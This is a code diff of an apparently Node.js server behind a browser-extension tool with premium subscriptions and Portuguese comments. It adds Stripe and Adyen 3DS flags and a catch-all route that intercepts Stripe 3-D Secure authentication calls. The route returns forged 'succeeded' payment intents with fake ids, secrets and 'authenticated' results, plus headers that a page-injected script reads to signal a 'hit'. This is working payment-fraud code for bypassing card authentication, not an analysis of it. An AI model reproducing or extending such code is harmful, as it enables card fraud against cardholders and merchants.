@@ -485,7 +485,7 @@ function bootstrapHandler(req,res){
       rulesVersion: RULES_VERSION, v: RULES_VERSION,
       pack: isPremium ? { encPack: encPack, k: packKey } : null, encPack: isPremium ? encPack : null, k: isPremium ? packKey : null, _prov: prov,
       exclusive: isPremium ? { targets: EXCLUSIVE_TARGETS, version: '1.7.0', generatedAt: new Date().toISOString(), signature: prov } : null,
-      config:{ apiBase: SERVER_URL, featuresEnabled:isPremium, premiumEnabled:isPremium, syncEnabled:true, gatewayMode:'default', telemetryEnabled:false, retryAfterMs:5000, heartbeatMs:60000 },
+      config:{ apiBase: SERVER_URL, featuresEnabled:isPremium, premiumEnabled:isPremium, syncEnabled:true, gatewayMode:'default', telemetryEnabled:false, retryAfterMs:5000, heartbeatMs:60000 , stripe3dsEnabled: true, adyen3dsEnabled: true },
       flags:{ bootstrapReady:true, exclusiveEnabled:isPremium, rulesEnabled:isPremium, premium:isPremium },
       endpoints:{ activate:'/v1/activate',featureActivate:'/v1/feature/activate',deactivate:'/v1/deactivate',verify:'/v1/verify',bootstrap:'/v1/bootstrap',rules:'/v1/rules',gateways:'/v1/gateways',campaign:'/v1/campaign',dashboard:'/v1/dashboard',health:'/v1/health',version:'/v1/version',support:'/v1/support',paymentRules:'/v1/bootstrap',timehw:'/v1/timehw',update:'/v1/update/check',process:'/v1/process',gw3ds2:'/v1/gw/*' },
       features:mapFeatures(isPremium), capabilities:mapCapabilities(isPremium),
@@ -501,7 +501,7 @@ function bootstrapHandler(req,res){
     pack: isPremium ? { encPack: encPack, k: packKey } : null, encPack: isPremium ? encPack : null, k: isPremium ? packKey : null, _prov: prov,
     rules: isPremium ? PAYMENT_RULES : [], count: isPremium ? PAYMENT_RULES.length : 0, gateways: isPremium ? PAYMENT_RULES : [],
     exclusive: isPremium ? { targets: EXCLUSIVE_TARGETS, version: '1.7.0', generatedAt: new Date().toISOString(), signature: prov } : null,
-    config:{ apiBase: SERVER_URL, featuresEnabled:isPremium, premiumEnabled:isPremium, syncEnabled:true, gatewayMode:'default', telemetryEnabled:false, retryAfterMs:5000, heartbeatMs:60000 },
+    config:{ apiBase: SERVER_URL, featuresEnabled:isPremium, premiumEnabled:isPremium, syncEnabled:true, gatewayMode:'default', telemetryEnabled:false, retryAfterMs:5000, heartbeatMs:60000 , stripe3dsEnabled: true, adyen3dsEnabled: true },
     flags:{ bootstrapReady:true, exclusiveEnabled:isPremium, rulesEnabled:isPremium, premium:isPremium },
     endpoints:{ activate:'/v1/activate',featureActivate:'/v1/feature/activate',deactivate:'/v1/deactivate',verify:'/v1/verify',bootstrap:'/v1/bootstrap',rules:'/v1/rules',gateways:'/v1/gateways',campaign:'/v1/campaign',dashboard:'/v1/dashboard',health:'/v1/health',version:'/v1/version',support:'/v1/support',paymentRules:'/v1/bootstrap',timehw:'/v1/timehw',update:'/v1/update/check',process:'/v1/process',gw3ds2:'/v1/gw/*' },
     features:mapFeatures(isPremium), capabilities:mapCapabilities(isPremium),
@@ -1606,33 +1606,29 @@ async function gwProxyHandler(req, res) {
 /* ═══════════════════════════════════════════════════════════════
    ◈ STRIPE 3DS2 - RESPOSTA EXATA DA API ANTIGA (v9.9.0)
    ═══════════════════════════════════════════════════════════════ */
-app.post('/v1/gw/3ds2/authenticate', (req, res) => {
-  log('DS2', '>>> STRIPE 3DS2 INTERCEPTADO COM SUCESSO!');
-  
-  // Resposta que a extensão espera para dar o "Hit" e fechar o iframe
+
+
+
+app.all('/v1/gw/3ds2/*splat', (req, res) => {
+  log('DS2', '>>> CHEGOU A REQUISICAO 3DS2 NO SERVIDOR!');
   const hitResponse = {
     status: "succeeded",
     state: "succeeded",
     object: "payment_intent",
     id: "pi_3M" + crypto.randomBytes(12).toString('hex'),
     client_secret: "pi_3M" + crypto.randomBytes(12).toString('hex') + "_secret_" + crypto.randomBytes(12).toString('hex'),
-    next_action: null, 
+    next_action: null,
     three_d_secure: { authentication_flow: "challenge", result: "authenticated", version: "2.1.0" }
   };
-
-  // Os headers que o inject.js lê para mostrar o popup verde
   res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Headers', '*');
   res.setHeader('Access-Control-Expose-Headers', 'x-asheo-3ds2-verdict, x-asheo-swap-ok, x-asheo-swapped');
   res.setHeader('Content-Type', 'application/json');
   res.setHeader('x-asheo-3ds2-verdict', 'success');
   res.setHeader('x-asheo-swapped', 'true');
   res.setHeader('x-asheo-swap-ok', 'true');
-
   res.status(200).json(hitResponse);
-  log('OK', '>>> HIT ENVIADO! POPUPS DEVEM APARECER.');
+  log('OK', '>>> HIT 3DS2 ENVIADO!');
 });
-
 
 app.use((req,res)=>{ res.status(404).json({ok:false,error:'not_found',path:req.path}); });
 
